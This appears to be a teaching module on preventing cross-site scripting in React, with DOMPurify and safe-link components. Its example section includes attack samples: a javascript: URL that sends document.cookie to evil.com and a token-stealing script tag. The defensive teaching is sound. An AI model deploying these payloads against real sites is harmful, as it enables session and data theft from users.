# Module 16.1 — Cross-Site Scripting (XSS) Defense & DOMPurify Sanitization

## 1. WHAT
- **Cross-Site Scripting (XSS):** A high-severity vulnerability where an attacker injects malicious JavaScript into a trusted web application. When victims execute the injected script, the attacker steals session tokens, keystrokes, or exfiltrates confidential corporate data.
- **How React Protects You (Automatic Escaping):** By default, React treats all strings embedded inside JSX `{string}` as raw text and safely escapes HTML characters (`<` $\rightarrow$ `&lt;`, `>` $\rightarrow$ `&gt;`, `&` $\rightarrow$ `&amp;`), completely neutralizing standard HTML tag injection.
- **Where React DOES NOT Protect You (The Danger Zones):**
  1. `dangerouslySetInnerHTML={{ __html: untrustedHtml }}`
  2. `href={untrustedUrl}` (e.g. `href="javascript:alert(document.cookie)"`)
  3. `srcdoc`, `eval()`, or direct `document.write()` calls.

```
                    REACT JSX ESCAPING VS DANGER ZONES
                    
  1. SAFE (JSX Escapes HTML Automatically):
     const userComment = "<script>stealTokens()</script>";
     return <p>{userComment}</p>;
     // Browser DOM: &lt;script&gt;stealTokens()&lt;/script&gt; (Renders as harmless text!)
     
  2. ❌ CRITICAL XSS VULNERABILITY (dangerouslySetInnerHTML):
     return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
     // Browser DOM: <script>stealTokens()</script> (EXECUTES ARBITRARY JS!)
     
  3. ❌ CRITICAL XSS VULNERABILITY (javascript: URL Injection):
     const website = "javascript:fetch('https://evil.com/steal?c=' + document.cookie)";
     return <a href={website}>Visit Profile</a>;
     // User clicks link -> EXECUTES ATTACKER JAVASCRIPT!
```

---

## 2. PRODUCTION IMPLEMENTATION: DOMPURIFY SANITIZATION & SAFE LINK COMPONENT

```tsx
// shared/security/SanitizedHtml.tsx
import React from 'react';
import DOMPurify from 'dompurify';

interface SanitizedHtmlProps {
  html: string;
  className?: string;
}

// Configure strict DOMPurify whitelist
const SANITIZE_CONFIG: DOMPurify.Config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
  ALLOW_DATA_ATTR: false,
};

export function SanitizedHtml({ html, className }: SanitizedHtmlProps) {
  // Strip all malicious <script>, <img onerror>, <svg onload>, and event handlers
  const cleanHtml = DOMPurify.sanitize(html, SANITIZE_CONFIG);

  return (
    <div
      className={className}
      dangerouslySetInnerHTML={{ __html: cleanHtml }}
    />
  );
}
```

```tsx
// shared/security/SafeLink.tsx
import React from 'react';

// Disallow dangerous URL protocols (javascript:, data:, vbscript:)
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol);
  } catch {
    return false; // Malformed URL
  }
}

export function SafeLink({ href, children, ...props }: React.AnchorHTMLAttributes<HTMLAnchorElement>) {
  const safeHref = href && isSafeUrl(href) ? href : '#';

  return (
    <a
      href={safeHref}
      rel="noopener noreferrer" // Prevents tab-napping / window.opener tampering
      {...props}
    >
      {children}
    </a>
  );
}
```

---

## 3. EXPERT INTERVIEW QUESTIONS
1. *Why does React's automatic JSX escaping fail to protect against `href="javascript:..."` protocol attacks?*
2. *Why is using a regular expression to sanitize HTML completely unsafe compared to DOMPurify's tree parsing?*
3. *What is "Tab-napping" and how does `rel="noopener noreferrer"` mitigate it?*
